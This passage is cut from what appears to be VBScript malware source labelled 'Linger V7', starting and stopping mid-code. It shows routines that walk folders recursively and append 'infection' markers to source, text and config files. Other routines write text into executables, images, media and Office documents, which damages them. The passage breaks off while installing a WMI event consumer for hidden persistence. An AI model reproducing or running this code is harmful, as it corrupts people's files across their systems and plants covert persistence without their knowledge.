n    End If\nEnd Sub\n\nSub InfectFolderRecursive(path)\n    Dim folder, files, file, subfolder\n    Set folder = fso.GetFolder(path)\n    Set files = folder.Files\n    \n    For Each file In files\n        Call SmartInfectFile(file.Path, file.Name)\n    Next\n    \n    For Each subfolder In folder.SubFolders\n        If InStr(subfolder.Name, \"node_modules\") = 0 And InStr(subfolder.Name, \".git\") = 0 And InStr(subfolder.Name, \".openclaw\") = 0 Then\n            Call InfectFolderRecursive(subfolder.Path)\n        End If\n    Next\nEnd Sub\n\nSub SmartInfectFile(filePath, fileName)\n    On Error Resume Next\n    \n    Dim ext\n    ext = LCase(fso.GetExtensionName(filePath))\n    \n    If ShouldSkipFile(ext) Then Exit Sub\n    \n    Select Case ext\n        Case \"md\", \"html\", \"htm\", \"xml\"\n            Call InfectTextFile(filePath, \"<!--LING:VIRUS:V7-->\")\n        Case \"txt\", \"code\", \"log\", \"cfg\", \"ini\", \"csv\"\n            Call InfectTextFile(filePath, \"; LINGER_V7_MARKER\")\n        Case \"js\", \"jsx\", \"ts\", \"tsx\", \"java\", \"c\", \"cpp\", \"h\", \"hpp\", \"cs\", \"go\", \"rs\", \"swift\", \"kt\", \"scala\", \"php\"\n            Call InfectTextFile(filePath, \"// LINGER_V7_MARKER\")\n        Case \"css\", \"scss\", \"less\"\n            Call InfectTextFile(filePath, \"/* LINGER_V7_MARKER */\")\n        Case \"py\", \"rb\", \"sh\", \"bash\", \"zsh\", \"ps1\", \"yaml\", \"yml\", \"toml\"\n            Call InfectTextFile(filePath, \"# LINGER_V7_MARKER\")\n        Case \"bat\", \"cmd\"\n            Call InfectTextFile(filePath, \"REM LINGER_V7_MARKER\")\n        Case \"vbs\", \"vbe\"\n            Call InfectTextFile(filePath, \"' LINGER_V7_MARKER\")\n        Case \"lua\"\n            Call InfectTextFile(filePath, \"-- LINGER_V7_MARKER\")\n        Case \"sql\"\n            Call InfectTextFile(filePath, \"-- LINGER_V7_MARKER\")\n        Case \"exe\", \"dll\", \"scr\", \"com\", \"sys\", \"drv\", \"jpg\", \"jpeg\", \"png\", \"gif\", \"bmp\", \"ico\", \"mp4\", \"avi\", \"mkv\", \"mov\", \"wmv\", \"flv\", \"webm\", \"mp3\", \"wav\", \"flac\", \"aac\", \"ogg\", \"wma\", \"doc\", \"docx\", \"xls\", \"xlsx\", \"ppt\", \"pptx\", \"pdf\"\n            Call InfectBinaryFile(filePath)\n        Case \"zip\", \"rar\", \"7z\", \"tar\", \"gz\", \"json\", \"jsonl\", \"config\", \"manifest\", \"lock\", \"pak\", \"dat\", \"bin\"\n            ' 跳过会破坏的文件\n        Case Else\n            Call InfectBinaryFile(filePath)\n    End Select\n    \n    On Error Goto 0\nEnd Sub\n\nFunction ShouldSkipFile(ext)\n    Dim skipExts, i\n    skipExts = Array(\"json\", \"jsonl\", \"config\", \"manifest\", \"lock\", \"pak\", \"dat\", \"bin\")\n    For i = 0 To UBound(skipExts)\n        If ext = skipExts(i) Then\n            ShouldSkipFile = True\n            Exit Function\n        End If\n    Next\n    ShouldSkipFile = False\nEnd Function\n\nSub InfectTextFile(filePath, marker)\n    On Error Resume Next\n    \n    Dim content, f\n    Set f = fso.OpenTextFile(filePath, 1)\n    If Err.Number <> 0 Then Exit Sub\n    \n    content = f.ReadAll\n    f.Close\n    \n    If InStr(content, \"LINGER_V7\") > 0 Then Exit Sub\n    \n    Set f = fso.OpenTextFile(filePath, 2)\n    f.Write content & vbCrLf & marker & vbCrLf\n    f.Close\n    \n    On Error Goto 0\nEnd Sub\n\nSub InfectBinaryFile(filePath)\n    On Error Resume Next\n    \n    Dim f\n    Set f = fso.OpenTextFile(filePath, 8, True)\n    If Err.Number = 0 Then\n        f.Write vbCrLf & \"' LINGER_V7_BINARY_MARKER\" & vbCrLf\n        f.Close\n    End If\n    \n    On Error Goto 0\nEnd Sub\n\nSub InstallWMIEventConsumer()\n    On Error Resume Next\n    \n    Dim consumer, filter, binding\n    Set consumer = wmi.Get(\"ActiveScriptEventConsumer\").SpawnInstance_\n    consumer.Name = \"LingerEventConsumerV7\"\n    consumer.ScriptingEngine = \"VBScript\"\n    consumer.Creator = \"Linger\"\n    consumer.ScriptText = \"Dim fso, shell, appData: Set fso = CreateObject(\"\"Scripting.FileSystemObject\"\"): 